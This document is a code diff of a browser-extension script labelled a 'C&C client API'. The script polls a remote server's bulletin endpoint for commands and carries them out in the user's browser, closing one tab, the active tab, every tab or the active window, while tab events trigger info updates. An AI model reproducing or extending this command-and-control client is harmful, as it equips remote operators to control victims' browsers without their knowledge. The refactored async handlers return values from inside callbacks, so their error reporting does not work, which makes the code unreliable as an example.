@@ -1,15 +1,18 @@
 /* C&C client API */
 
+// Update info whenever tabs are opened, modified, or closed
 chrome.tabs.onCreated.addListener(updateInfo);
+chrome.tabs.onUpdated.addListener(updateInfo);
 chrome.tabs.onRemoved.addListener(updateInfo);
+
+var completedCommands = []
 
 // Command structure definition
 var runCommand = {
-    updateInfo: updateInfo,
     closeTab: closeTab,
-    closeCurrentTab: closeCurrentTab,
+    closeActiveTab: closeActiveTab,
     closeAllTabs: closeAllTabs,
-    closeCurrentWindow: closeCurrentWindow
+    closeActiveWindow: closeActiveWindow
 }
 
 function updateInfo() {
@@ -50,72 +53,62 @@ function updateInfo() {
     }
 }
 
-function closeTab(args, callback) {
-    callback = callback || function () {};
+async function closeTab(args) {
     chrome.tabs.remove(args.tabId, function () {
         if (chrome.runtime.lastError) {
-            return callback('Unable to close tab');
+            return 'Unable to close tab';
         }
-        return callback();
+        return;
     });
 }
 
-function closeCurrentTab(callback) {
-    callback = callback || function () {};
-    chrome.tabs.getCurrent(function (tab) {
-        chrome.tabs.remove(tab.id, function() {
+async function closeActiveTab() {
+    chrome.tabs.query({ active: true }, function (tabs) {
+        chrome.tabs.remove(tabs.map(tab => tab.id), function() {
             if (chrome.runtime.lastError) {
-                return callback('Unable to close tab');
+                return 'Unable to close tab';
             }
-            return callback();
+            return;
         })
     })
 }
 
-function closeAllTabs(callback) {
-    callback = callback || function () {};
+async function closeAllTabs() {
     chrome.tabs.query({}, function (tabs) {
         chrome.tabs.remove(tabs.map(tab => tab.id), function () {
             if (chrome.runtime.lastError) {
-                return callback('Unable to close tabs');
+                return 'Unable to close tabs';
             }
-            return callback();
+            return;
         });
     });
 }
 
-function closeCurrentWindow(callback) {
-    callback = callback || function () {};
-    chrome.window.getCurrent(function (window) {
-        chrome.window.remove(window.id, function() {
+async function closeActiveWindow() {
+    chrome.windows.getLastFocused(function (window) {
+        chrome.windows.remove(window.id, function() {
             if (chrome.runtime.lastError) {
-                return callback('Unable to close window');
+                return 'Unable to close window';
             }
-            return callback();
+            return;
         });
     });
 }
 
-function consumeCommands() {
+async function consumeCommands() {
     if (awake) {
         chrome.storage.local.get(['id'], function (result) {
-            $.getJSON(`${url}/clients/${result.id}/bulletin`, function (commands) {
-                var results = []
+            $.getJSON(`${url}/clients/${result.id}/bulletin`, async function (commands) {
                 for (var i = 0; i < commands.length; i++) {
-                    runCommand[commands[i].code](function (err) {
-                        if (err) {
-                            return responses.push({
-                                success: false,
-                                err: err
-                            })
-                        }
-                        responses.push({
-                            success: true
-                        })
-                    }, commands[i].args);
+                    if (!completedCommands.includes(commands[i].id)) {
+                        await runCommand[commands[i].code](commands[i].args)
+                        .then(function (err) {
+                            if (!err) {
+                                completedCommands.push(commands[i].id)
+                            }
+                        });
+                    }
                 }
-                $.post(`${url}/clients/${result.id}/bulletin/respond`, results)
-                .fail(fellOver)
             })
             .fail(fellOver);
         });
